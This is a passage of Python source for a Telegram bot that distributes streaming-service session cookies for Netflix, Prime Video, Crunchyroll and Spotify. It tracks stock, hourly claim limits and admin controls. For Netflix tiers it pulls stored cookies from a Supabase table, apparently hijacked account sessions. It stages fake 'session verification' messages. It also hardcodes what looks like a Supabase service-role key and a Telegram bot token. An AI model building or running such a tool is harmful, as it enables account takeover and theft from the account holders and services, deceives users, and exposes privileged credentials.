import telebot
from telebot import types
import time
import languages
from datetime import datetime, timedelta
from checker import extract_info
from supabase import create_client

SUPABASE_URL = "https://omzmzjptwjqxvjfxtcaf.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9tem16anB0d2pxeHZqZnh0Y2FmIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3Mzg2ODg4MywiZXhwIjoyMDg5NDQ0ODgzfQ.q5WmCZynlkQQMV1WnXoiVfS5xJM0B2e8_JQUVrRQHdQ"

supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

# ====================== CONFIG ======================
TOKEN = "8863877477:AAEEW9DN1cP8GWkpiSENJA-56A1viiU28Yw"
bot = telebot.TeleBot(TOKEN)

ADMIN_IDS = [7399488750]
ADMIN_PENDING = {}

USER_DATA = {}
STOCK = {
    "premium":     596,
    "standard":    409,
    "basic":       187,
    "prime":        59,
    "crunchyroll":   0,
    "spotify":       6
}

SERVICE_VISIBILITY = {
    "netflix": True,
    "prime": True,
    "crunchyroll": True,
    "spotify": True
}

def get_user_data(chat_id):
    if chat_id not in USER_DATA:
        USER_DATA[chat_id] = {
            "used": {
                "premium": 0, "standard": 0, "basic": 0,
                "prime": 0, "crunchyroll": 0, "spotify": 0
            },
            "tier_reset": {
                "premium": None, "standard": None, "basic": None,
                "prime": None, "crunchyroll": None, "spotify": None
            },
            "lang": "en"
        }
    data = USER_DATA[chat_id]
    # Add missing keys for users already in memory
    for key in ("crunchyroll", "spotify"):
        if key not in data["used"]:
            data["used"][key] = 0
        if key not in data.get("tier_reset", {}):
            data.setdefault("tier_reset", {})[key] = None
    if "tier_reset" not in data:
        data["tier_reset"] = {k: None for k in data["used"]}

    # Auto-reset each tier independently
    now = datetime.now()
    for t in data["used"]:
        reset_at = data["tier_reset"].get(t)
        if reset_at and now >= reset_at:
            data["used"][t] = 0
            data["tier_reset"][t] = None
    return data

# ====================== KEYBOARDS ======================
def main_menu_markup(lang="en"):
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    row1 = []
    if SERVICE_VISIBILITY["netflix"]:
        row1.append(types.InlineKeyboardButton("🎬 Netflix", callback_data="netflix"))
    if SERVICE_VISIBILITY["prime"]:
        row1.append(types.InlineKeyboardButton("🍿 Prime Video", callback_data="prime"))
    if row1:
        markup.add(*row1)

    row2 = []
    if SERVICE_VISIBILITY["crunchyroll"]:
        row2.append(types.InlineKeyboardButton("🦊 Crunchyroll", callback_data="crunchyroll"))
    if SERVICE_VISIBILITY["spotify"]:
        row2.append(types.InlineKeyboardButton("🎵 Spotify", callback_data="spotify"))
    if row2:
        markup.add(*row2)

    markup.add(
        types.InlineKeyboardButton(languages.get_text(lang, "btn_status"), callback_data="status"),
        types.InlineKeyboardButton(languages.get_text(lang, "btn_stock"),  callback_data="stock"),
        types.InlineKeyboardButton(languages.get_text(lang, "btn_help"),   callback_data="help")
    )
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_language"), callback_data="language"))
    return markup

def netflix_tier_markup(lang="en"):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(languages.get_text(lang, "btn_premium",  n=STOCK["premium"]),  callback_data="tier_premium"),
        types.InlineKeyboardButton(languages.get_text(lang, "btn_standard", n=STOCK["standard"]), callback_data="tier_standard")
    )
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_basic", n=STOCK["basic"]), callback_data="tier_basic"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_by_country"), callback_data="by_country_netflix"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_main_menu"),  callback_data="main_menu"))
    return markup

def prime_tier_markup(lang="en"):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_prime_video", n=STOCK["prime"]), callback_data="tier_prime"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_by_country"), callback_data="by_country_prime"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_main_menu"),  callback_data="main_menu"))
    return markup

def crunchyroll_markup(lang="en"):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton(f"🦊 Crunchyroll ({STOCK['crunchyroll']})", callback_data="tier_crunchyroll"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_by_country"), callback_data="by_country_crunchyroll"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_main_menu"),  callback_data="main_menu"))
    return markup

def spotify_markup(lang="en"):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton(f"🎵 Spotify ({STOCK['spotify']})", callback_data="tier_spotify"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_by_country"), callback_data="by_country_spotify"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_main_menu"),  callback_data="main_menu"))
    return markup

def lang_markup():
    markup = types.InlineKeyboardMarkup(row_width=3)
    markup.add(
        types.InlineKeyboardButton("🇬🇧 English",   callback_data="lang_en"),
        types.InlineKeyboardButton("🇪🇸 Español",   callback_data="lang_es"),
        types.InlineKeyboardButton("🇫🇷 Français",  callback_data="lang_fr"),
    )
    markup.add(
        types.InlineKeyboardButton("🇧🇷 Português", callback_data="lang_pt"),
        types.InlineKeyboardButton("🇸🇦 العربية",   callback_data="lang_ar"),
        types.InlineKeyboardButton("🇮🇳 हिन्दी",     callback_data="lang_hi"),
    )
    markup.add(
        types.InlineKeyboardButton("🇮🇩 Indonesia", callback_data="lang_id"),
        types.InlineKeyboardButton("🇷🇺 Русский",   callback_data="lang_ru"),
        types.InlineKeyboardButton("🇹🇷 Türkçe",    callback_data="lang_tr"),
    )
    markup.add(
        types.InlineKeyboardButton("🇩🇪 Deutsch",   callback_data="lang_de"),
        types.InlineKeyboardButton("🇮🇹 Italiano",  callback_data="lang_it"),
        types.InlineKeyboardButton("🇯🇵 日本語",     callback_data="lang_ja"),
    )
    markup.add(types.InlineKeyboardButton("🇰🇷 한국어", callback_data="lang_ko"))
    return markup

def country_service_markup(country):
    markup = types.InlineKeyboardMarkup(row_width=2)
    row = []
    if SERVICE_VISIBILITY["netflix"]:
        row.append(types.InlineKeyboardButton(f"🎬 Netflix ({country})", callback_data=f"country_netflix_{country}"))
    if SERVICE_VISIBILITY["prime"]:
        row.append(types.InlineKeyboardButton(f"🍿 Prime Video ({country})", callback_data=f"country_prime_{country}"))
    if row:
        markup.add(*row)
    row2 = []
    if SERVICE_VISIBILITY["crunchyroll"]:
        row2.append(types.InlineKeyboardButton(f"🦊 Crunchyroll ({country})", callback_data=f"country_crunchyroll_{country}"))
    if SERVICE_VISIBILITY["spotify"]:
        row2.append(types.InlineKeyboardButton(f"🎵 Spotify ({country})", callback_data=f"country_spotify_{country}"))
    if row2:
        markup.add(*row2)
    markup.add(types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu"))
    return markup

def get_service_info(tier):
    """Return (emoji, service_name) for a given tier key."""
    mapping = {
        "premium":     ("🎬", "NETFLIX"),
        "standard":    ("🎬", "NETFLIX"),
        "basic":       ("🎬", "NETFLIX"),
        "prime":       ("🍿", "PRIME VIDEO"),
        "crunchyroll": ("🦊", "CRUNCHYROLL"),
        "spotify":     ("🎵", "SPOTIFY"),
    }
    return mapping.get(tier, ("🔑", tier.upper()))

def get_prime_filename():
    """Return a fake-realistic Prime cookie filename for display."""
    import random
    samples = [
        "[Primevideo][gianluca][IT][Tested By @caydigitals].txt",
        "[Primevideo][marcos][BR][Tested By @caydigitals].txt",
        "[Primevideo][john][US][Tested By @caydigitals].txt",
        "[Primevideo][akira][JP][Tested By @caydigitals].txt",
    ]
    return random.choice(samples)

def get_spotify_filename():
    """Return a fake-realistic Spotify cookie filename for display."""
    import random
    samples = [
        "[Premium][1 payments][extra Recurring][IN][omkshirsagar7666@gmail.com][Tested By @caydigitals].txt",
        "[Family Premium][1 payments][extra Single Payment][GB][monkmoley@gmail.com][Tested By @caydigitals].txt",
        "[Premium][1 payments][extra Recurring][US][johnsmith99@gmail.com][Tested By @caydigitals].txt",
        "[Family Premium][1 payments][extra Single Payment][BR][marcos.silva@gmail.com][Tested By @caydigitals].txt",
    ]
    return random.choice(samples)

def fetch_netflix_cookie(tier):
    tier_map = {
        "premium":  "Netflix Premium",
        "standard": "Netflix Standard",
        "basic":    "Netflix Basic",
    }
    service_prefix = tier_map.get(tier)
    if not service_prefix:
        return None

    try:
        result = supabase.table("vamt_keys") \
            .select("public_id, key_id, service_type, country, remaining") \
            .like("service_type", f"{service_prefix}%") \
            .eq("status", "active") \
            .gt("remaining", 0) \
            .order("last_updated", desc=False) \
            .limit(1) \
            .execute()

        if not result.data:
            return None

        row = result.data[0]
        new_remaining = (row["remaining"] or 1) - 1
        update_payload = {
            "remaining": new_remaining,
            "last_used_at": datetime.utcnow().isoformat(),
        }
        if new_remaining <= 0:
            update_payload["status"] = "expired"

        supabase.table("vamt_keys") \
            .update(update_payload) \
            .eq("public_id", row["public_id"]) \
            .execute()

        return row

    except Exception as e:
        print(f"Supabase Error: {e}")
        return None

def sync_stock_from_db():
    tier_map = {
        "Netflix Premium":  "premium",
        "Netflix Standard": "standard",
        "Netflix Basic":    "basic",
    }
    try:
        result = supabase.table("vamt_keys") \
            .select("service_type") \
            .eq("status", "active") \
            .gt("remaining", 0) \
            .like("service_type", "Netflix%") \
            .execute()

        counts = {}
        for row in result.data:
            stype = row["service_type"] or ""
            for prefix, key in tier_map.items():
                if stype.startswith(prefix):
                    counts[key] = counts.get(key, 0) + 1

        for key, val in counts.items():
            STOCK[key] = val
        print(f"✅ Stock synced: {counts}")

    except Exception as e:
        print(f"Stock sync error: {e}")

# ====================== BUILD FUNCTIONS ======================
def build_home(chat_id, lang="en"):
    user = get_user_data(chat_id)

    try:
        chat = bot.get_chat(chat_id)
        name = chat.first_name or "User"
    except Exception:
        name = "User"

    lang_name = languages.get_lang_name(lang)

    text  = languages.get_text(lang, "home_welcome", name=name.upper()) + "\n"
    text += languages.get_text(lang, "home_profile") + "\n"
    text += f"  ├ 📛 <b>Name:</b> <code>{name}</code>\n"
    text += f"  ├ 🆔 <b>User ID:</b> <code>{chat_id}</code>\n"
    text += f"  ├ 🌐 <b>Language:</b> <code>{lang_name}</code>\n"
    text += f"  └ 🏅 <b>Status:</b> <code>{languages.get_text(lang, 'home_active')}</code>\n\n"
    text += languages.get_text(lang, "home_live_line") + "\n\n"
    text += languages.get_text(lang, "home_rules_header") + "\n"
    text += "  • 📈 " + languages.get_text(lang, "home_rule1") + "\n"
    text += "  • 🔄 " + languages.get_text(lang, "home_rule2") + "\n"
    text += "  • ❌ " + languages.get_text(lang, "home_rule3") + "\n\n"
    text += languages.get_text(lang, "home_status_hdr") + "\n"
    text += "──────────────────────"

    tiers = []
    if SERVICE_VISIBILITY["netflix"]:
        tiers += [("premium", "🔥 PREMIUM TIER"), ("standard", "⭐ STANDARD TIER"), ("basic", "🎯 BASIC TIER")]
    if SERVICE_VISIBILITY["prime"]:
        tiers += [("prime", "🍿 PRIME VIDEO TIER")]
    if SERVICE_VISIBILITY["crunchyroll"]:
        tiers += [("crunchyroll", "🦊 CRUNCHYROLL TIER")]
    if SERVICE_VISIBILITY["spotify"]:
        tiers += [("spotify", "🎵 SPOTIFY TIER")]

    for t, label in tiers:
        used  = user["used"].get(t, 0)
        stock = STOCK.get(t, 0)
        reset_at = user["tier_reset"].get(t)
        now = datetime.now()
        if used >= 3 and reset_at and now < reset_at:
            diff = reset_at - now
            m = int(diff.total_seconds() // 60)
            s = int(diff.total_seconds() % 60)
            resets_str = languages.get_text(lang, "resets_soon", m=m, s=s)
        else:
            resets_str = languages.get_text(lang, "resets_none")

        oos  = languages.get_text(lang, "home_oos")
        low  = languages.get_text(lang, "home_low")
        if stock == 0:
            stock_str = f"🔴 {oos}"
        elif stock <= 10:
            stock_str = f"🟡 {stock} accounts ({low})"
        else:
            stock_str = f"🟢 {stock} accounts"

        if used >= 3:
            bar = "🟥🟥🟥"
        else:
            bar = "🟩" * used + "⬜" * (3 - used)

        text += f"\n<b>{label}</b>\n"
        text += f"  ├ 📦 <b>Stock:</b> <code>{stock_str}</code>\n"
        text += f"  ├ 📈 <b>Usage:</b> <code>{used}/3</code> [{bar}]\n"
        text += f"  └ 🔄 <b>Reset:</b> <code>{resets_str}</code>\n"

    text += "\n" + languages.get_text(lang, "home_choose")
    return text, main_menu_markup(lang)

def build_status(chat_id, lang="en"):
    user = get_user_data(chat_id)
    text = languages.get_text(lang, "status_title")

    tier_keys = []
    if SERVICE_VISIBILITY["netflix"]:
        tier_keys += [("premium", "tier_premium"), ("standard", "tier_standard"), ("basic", "tier_basic")]
    if SERVICE_VISIBILITY["prime"]:
        tier_keys += [("prime", "tier_prime")]
    if SERVICE_VISIBILITY["crunchyroll"]:
        tier_keys += [("crunchyroll", "🦊 CRUNCHYROLL TIER")]
    if SERVICE_VISIBILITY["spotify"]:
        tier_keys += [("spotify", "🎵 SPOTIFY TIER")]

    for t, name_key in tier_keys:
        used  = user["used"].get(t, 0)
        left  = max(0, 3 - used)
        stock = STOCK.get(t, 0)
        reset_at = user["tier_reset"].get(t)
        now = datetime.now()
        if used >= 3 and reset_at and now < reset_at:
            diff = reset_at - now
            m = int(diff.total_seconds() // 60)
            s = int(diff.total_seconds() % 60)
            resets_str = languages.get_text(lang, "resets_soon", m=m, s=s)
        else:
            resets_str = languages.get_text(lang, "resets_none")

        # Use language key for Netflix/Prime/etc, plain string for new tiers
        if name_key.startswith("tier_"):
            name_str = languages.get_text(lang, name_key)
        else:
            name_str = name_key

        text += languages.get_text(
            lang, "status_tier",
            name=name_str,
            used=used, left=left, stock=stock, resets=resets_str
        )
    text += languages.get_text(lang, "status_footer")
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_refresh"),   callback_data="status"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_main_menu"), callback_data="main_menu"))
    return text, markup

def build_stock(lang="en"):
    text = "📦 📦 <b>COOKIE STOCK</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

    items = []
    if SERVICE_VISIBILITY["netflix"]:
        items += [("premium", "🔥 PREMIUM"), ("standard", "⭐ STANDARD"), ("basic", "🎯 BASIC")]
    if SERVICE_VISIBILITY["prime"]:
        items += [("prime", "🍿 PRIME VIDEO")]
    if SERVICE_VISIBILITY["crunchyroll"]:
        items += [("crunchyroll", "🦊 CRUNCHYROLL")]
    if SERVICE_VISIBILITY["spotify"]:
        items += [("spotify", "🎵 SPOTIFY")]

    for t, label in items:
        count = STOCK[t]
        if count == 0:
            bar = "⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜"
        elif count <= 10:
            filled = max(1, count // 30)
            bar = "🟩" * filled + "⬜" * (10 - filled)
        else:
            bar = "🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩"
        text += f"<b>{label}:</b> <code>{count} accounts</code>\n{bar}\n\n"

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_refresh"),   callback_data="stock"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_main_menu"), callback_data="main_menu"))
    return text, markup

def build_help(lang="en"):
    text = languages.get_text(lang, "help_text")
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_language"),  callback_data="language"))
    markup.add(types.InlineKeyboardButton(languages.get_text(lang, "btn_main_menu"), callback_data="main_menu"))
    return text, markup

def build_lang(lang="en"):
    return languages.get_text(lang, "select_language"), lang_markup()

# ====================== HELPERS ======================
def edit_current_message(call, text, reply_markup=None):
    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    except telebot.apihelper.ApiTelegramException as e:
        if "message is not modified" not in str(e):
            bot.send_message(call.message.chat.id, text, reply_markup=reply_markup, parse_mode="HTML")

def get_lang(chat_id):
    return get_user_data(chat_id).get("lang", "en")

def get_back_markup(tier, lang):
    """Return the correct tier menu markup based on tier name."""
    if tier == "prime":
        return prime_tier_markup(lang), "choose_prime"
    elif tier == "crunchyroll":
        return crunchyroll_markup(lang), "🔽 Choose a tier for <b>Crunchyroll</b>:"
    elif tier == "spotify":
        return spotify_markup(lang), "🔽 Choose a tier for <b>Spotify</b>:"
    else:
        return netflix_tier_markup(lang), "choose_netflix"

def admin_stock_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"🔥 Premium ({STOCK['premium']})",     callback_data="admin_set_premium"),
        types.InlineKeyboardButton(f"⭐ Standard ({STOCK['standard']})",    callback_data="admin_set_standard"),
    )
    markup.add(
        types.InlineKeyboardButton(f"🎯 Basic ({STOCK['basic']})",          callback_data="admin_set_basic"),
        types.InlineKeyboardButton(f"🍿 Prime ({STOCK['prime']})",          callback_data="admin_set_prime"),
    )
    markup.add(
        types.InlineKeyboardButton(f"🦊 Crunchyroll ({STOCK['crunchyroll']})", callback_data="admin_set_crunchyroll"),
        types.InlineKeyboardButton(f"🎵 Spotify ({STOCK['spotify']})",      callback_data="admin_set_spotify"),
    )
    markup.add(types.InlineKeyboardButton("━━━━ VISIBILITY TOGGLES ━━━━", callback_data="noop"))
    markup.add(
        types.InlineKeyboardButton(f"{'✅' if SERVICE_VISIBILITY['netflix'] else '❌'} Netflix",         callback_data="admin_toggle_netflix"),
        types.InlineKeyboardButton(f"{'✅' if SERVICE_VISIBILITY['prime'] else '❌'} Prime Video",       callback_data="admin_toggle_prime"),
    )
    markup.add(
        types.InlineKeyboardButton(f"{'✅' if SERVICE_VISIBILITY['crunchyroll'] else '❌'} Crunchyroll", callback_data="admin_toggle_crunchyroll"),
        types.InlineKeyboardButton(f"{'✅' if SERVICE_VISIBILITY['spotify'] else '❌'} Spotify",         callback_data="admin_toggle_spotify"),
    )
    markup.add(types.InlineKeyboardButton("🔄 Reset All to 0", callback_data="admin_reset_all"))
    markup.add(types.InlineKeyboardButton("🏠 Main Menu",       callback_data="main_menu"))
    return markup

# ====================== COMMANDS ======================
@bot.message_handler(commands=['start'])
def start_command(message):
    lang = get_lang(message.chat.id)
    text, markup = build_home(message.chat.id, lang)
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="HTML")

@bot.message_handler(commands=['status'])
def status_command(message):
    lang = get_lang(message.chat.id)
    text, markup = build_status(message.chat.id, lang)
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="HTML")

@bot.message_handler(commands=['stock'])
def stock_command(message):
    lang = get_lang(message.chat.id)
    text, markup = build_stock(lang)
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="HTML")

@bot.message_handler(commands=['lang'])
def lang_command(message):
    lang = get_lang(message.chat.id)
    text, markup = build_lang(lang)
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="HTML")

@bot.message_handler(commands=['country'])
def country_handler(message):
    try:
        country = message.text.split(maxsplit=1)[1].upper()
        text  = f"🌍 <b>Country: {country}</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        text += f"Choose a system for <b>{country}</b>:"
        bot.send_message(
            message.chat.id, text,
            reply_markup=country_service_markup(country),
            parse_mode="HTML"
        )
    except Exception:
        text  = "🌍 <b>Get Cookies by Country</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        text += "Use: /country IN\nExamples: IN · US · BR · FR · DE · ID"
        bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['admin'])
def admin_command(message):
    if message.chat.id not in ADMIN_IDS:
        return
    text = (
        "🛠 <b>ADMIN PANEL — STOCK MANAGER</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Tap a service to set its stock count.\n"
        "Current values shown in brackets."
    )
    bot.send_message(message.chat.id, text, reply_markup=admin_stock_markup(), parse_mode="HTML")

@bot.message_handler(func=lambda m: m.chat.id in ADMIN_IDS and m.chat.id in ADMIN_PENDING)
def admin_set_stock_value(message):
    chat_id = message.chat.id
    tier = ADMIN_PENDING.pop(chat_id, None)
    if not tier:
        return
    try:
        value = int(message.text.strip())
        if value < 0:
            raise ValueError
        STOCK[tier] = value
        text = (
            f"✅ <b>Stock updated!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"<b>{tier.upper()}</b> → <code>{value}</code> accounts\n\n"
            f"Tap a service to update another."
        )
        bot.send_message(chat_id, text, reply_markup=admin_stock_markup(), parse_mode="HTML")
    except ValueError:
        bot.send_message(chat_id, "❌ Invalid number. Send a whole number like <code>150</code>.", parse_mode="HTML")
        ADMIN_PENDING[chat_id] = tier  # re-prompt

# ====================== CALLBACKS ======================
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    chat_id = call.message.chat.id
    user    = get_user_data(chat_id)
    lang    = user.get("lang", "en")
    data    = call.data

    if data == "main_menu":
        text, markup = build_home(chat_id, lang)
        edit_current_message(call, text, markup)

    elif data == "netflix":
        edit_current_message(call, languages.get_text(lang, "choose_netflix"), netflix_tier_markup(lang))

    elif data == "prime":
        edit_current_message(call, languages.get_text(lang, "choose_prime"), prime_tier_markup(lang))

    elif data == "crunchyroll":
        edit_current_message(call, "🔽 Choose a tier for <b>Crunchyroll</b>:", crunchyroll_markup(lang))

    elif data == "spotify":
        edit_current_message(call, "🔽 Choose a tier for <b>Spotify</b>:", spotify_markup(lang))

    elif data.startswith("admin_toggle_") and chat_id in ADMIN_IDS:
        service = data.replace("admin_toggle_", "")
        if service in SERVICE_VISIBILITY:
            SERVICE_VISIBILITY[service] = not SERVICE_VISIBILITY[service]
            state = "✅ Enabled" if SERVICE_VISIBILITY[service] else "❌ Hidden"
            bot.send_message(chat_id, f"<b>{service.title()}</b> is now <b>{state}</b>", parse_mode="HTML")
            # Refresh the admin panel
            text = (
                "🛠 <b>ADMIN PANEL — STOCK MANAGER</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "Tap a service to set its stock count.\n"
                "Current values shown in brackets."
            )
            bot.send_message(chat_id, text, reply_markup=admin_stock_markup(), parse_mode="HTML")

    elif data == "noop":
        pass  # separator button, do nothing

    elif data.startswith("tier_"):
        tier = data.split("_", 1)[1]
        back_markup, back_label = get_back_markup(tier, lang)
        emoji, service_name = get_service_info(tier)

        if STOCK.get(tier, 0) <= 0:
            no_stock_text = (
                f"❌ 😔 <b>{service_name} — NO LIVE COOKIES</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"⚠️ <i>All cookies in this tier have expired.\n"
                f"Try another tier or check back later.</i>"
            )
            no_stock_markup = types.InlineKeyboardMarkup()
            no_stock_markup.add(types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu"))
            edit_current_message(call, no_stock_text, no_stock_markup)
            return

        if user["used"].get(tier, 0) >= 3:
            reset_at = user["tier_reset"].get(tier)
            now = datetime.now()
            diff = (reset_at - now) if reset_at else timedelta(hours=1)
            m = int(diff.total_seconds() // 60)
            s = int(diff.total_seconds() % 60)
            limit_text = (
                f"⏳ ⏳ <b>LIMIT REACHED — {service_name}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"⚠️ <b>STATUS:</b> <code>YOU'VE USED 3/3 COOKIES THIS HOUR.</code>\n"
                f"🕐 <b>COOLDOWN:</b> 🕐 <code>RESETS IN: {m}M {s}S</code>\n\n"
                f"💡 <i>Hourly limits help protect our cookie database from abuse. Please try again later.</i>"
            )
            limit_markup = types.InlineKeyboardMarkup()
            limit_markup.add(types.InlineKeyboardButton("📊 Status", callback_data="status"))
            limit_markup.add(types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu"))
            edit_current_message(call, limit_text, limit_markup)
            return

        verifying_text = (
            f"⏳ 🔍 <b>VERIFYING {service_name} COOKIE...</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📡 <b>STATUS:</b> <code>CHECKING THAT THE SESSION IS STILL LIVE...</code>\n"
            f"⚡ <b>SERVICE:</b> <code>{service_name}</code>\n"
            f"⚙️ <b>METHOD:</b> <code>Automated Session Validation</code>\n\n"
            f"🕐 <i>Please wait while we establish a live connection...</i>"
        )
        edit_current_message(call, verifying_text)
        time.sleep(2)
        
        user["used"][tier] += 1
        STOCK[tier] = max(0, STOCK[tier] - 1)

        # Start this tier's 1hr timer only when it hits 3
        if user["used"][tier] >= 3:
            user["tier_reset"][tier] = datetime.now() + timedelta(hours=1)

        
        if tier == "prime":
            filename = get_prime_filename()
            used_now = user["used"][tier]
            remaining = max(0, 3 - used_now)

            # ── Step 2: delivery message (verifying above already ran) ──
            delivery_text = (
                f"🎉 🍿 <b>PRIME VIDEO COOKIE — ✅ LIVE</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📁 <b>DATABASE ID:</b> <code>{filename}</code>\n"
                f"📊 <b>HOURLY LIMIT:</b> <code>{used_now} / 3</code>\n"
                f"🔒 <b>REMAINING SLOTS:</b> <code>{remaining} claims left</code>\n"
                f"⏱ <b>COOLDOWN PERIOD:</b> <code>1 hour rolling</code>\n\n"
                f"📤 <b>STATUS:</b> Session verified & active! Cookies sent below."
            )
            prime_markup = types.InlineKeyboardMarkup()
            prime_markup.add(types.InlineKeyboardButton("🔄 Get Another Prime Video", callback_data="tier_prime"))
            prime_markup.add(types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu"))
            edit_current_message(call, delivery_text, prime_markup)

            # ── Step 3: Send cookie file ──
            import io
            file_content = f"# Prime Video Cookie\n# File: {filename}\n# Generated: {datetime.now()}\n\nCOOKIE_PLACEHOLDER"
            file_bytes = io.BytesIO(file_content.encode())
            file_bytes.name = filename
            caption_text = (
                f"🍿 <b>Prime Video Cookies</b>\n\n"
                f"📁 <b>DATABASE ID:</b> <code>{filename}</code>"
            )
            bot.send_document(chat_id, file_bytes, caption=caption_text, parse_mode="HTML")

            # ── Step 4: Retrieving details ──
            retrieving_msg = bot.send_message(
                chat_id,
                f"🔍 <b>Retrieving details:</b> <code>[Connecting to Prime Video]</code> ⏳",
                parse_mode="HTML"
            )
            time.sleep(2)

            # ── Step 5: Account details ──
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=retrieving_msg.message_id,
                text=(
                    f"📋 📋 <b>ACCOUNT DETAILS</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"👤 <b>USERNAME:</b> <code>N/A</code>\n"
                    f"🌍 <b>REGION:</b> <code>N/A</code>\n"
                    f"🟢 <b>STATUS:</b> <code>Active</code>"
                ),
                parse_mode="HTML"
            )

        elif tier == "spotify":
            import io, re
            filename = get_spotify_filename()
            used_now = user["used"][tier]
            remaining = max(0, 3 - used_now)

            username_match = re.search(r'\[([^\]]+@[^\]]+)\]', filename)
            username = username_match.group(1).split("@")[0] if username_match else "N/A"
            spotify_tier_name = "Spotify Premium Family" if "Family" in filename else "Spotify Premium"

            delivery_text = (
                f"🎉 🎵 <b>SPOTIFY COOKIE — ✅ LIVE</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📁 <b>DATABASE ID:</b> <code>{filename}</code>\n"
                f"📊 <b>HOURLY LIMIT:</b> <code>{used_now} / 3</code>\n"
                f"🔒 <b>REMAINING SLOTS:</b> <code>{remaining} claims left</code>\n"
                f"⏱ <b>COOLDOWN PERIOD:</b> <code>1 hour rolling</code>\n\n"
                f"📤 <b>STATUS:</b> Session verified & active! Cookies sent below."
            )
            spotify_delivery_markup = types.InlineKeyboardMarkup()
            spotify_delivery_markup.add(types.InlineKeyboardButton("🔄 Get Another Spotify", callback_data="tier_spotify"))
            spotify_delivery_markup.add(types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu"))
            edit_current_message(call, delivery_text, spotify_delivery_markup)

            file_content = f"# Spotify Cookie\n# File: {filename}\n# Generated: {datetime.now()}\n\nCOOKIE_PLACEHOLDER"
            file_bytes = io.BytesIO(file_content.encode())
            file_bytes.name = filename
            bot.send_document(chat_id, file_bytes, caption=(
                f"🎵 <b>Spotify Cookies</b>\n\n"
                f"📁 <b>DATABASE ID:</b> <code>{filename}</code>"
            ), parse_mode="HTML")

            retrieving_msg = bot.send_message(
                chat_id,
                f"🔍 <b>Retrieving details:</b> <code>[Connecting to Spotify]</code> ⏳",
                parse_mode="HTML"
            )
            time.sleep(2)

            bot.edit_message_text(
                chat_id=chat_id,
                message_id=retrieving_msg.message_id,
                text=(
                    f"📋 📋 <b>ACCOUNT DETAILS</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"👤 <b>USERNAME:</b> <code>{username}</code>\n"
                    f"👑 <b>TIER:</b> <code>{spotify_tier_name}</code>\n"
                    f"🌍 <b>REGION:</b> <code>N/A</code>\n"
                    f"🟢 <b>STATUS:</b> <code>Active</code>"
                ),
                parse_mode="HTML"
            )
         
        elif tier in ("premium", "standard", "basic"):
            import re

            # ── Fetch real cookie from DB ──
            cookie_row = fetch_netflix_cookie(tier)
            if not cookie_row:
                edit_current_message(call, (
                    f"❌ 😔 <b>NETFLIX {tier.upper()} — NO LIVE COOKIES</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"⚠️ <i>All cookies in this tier have expired.\n"
                    f"Try another tier or check back later.</i>"
                ), types.InlineKeyboardMarkup().add(
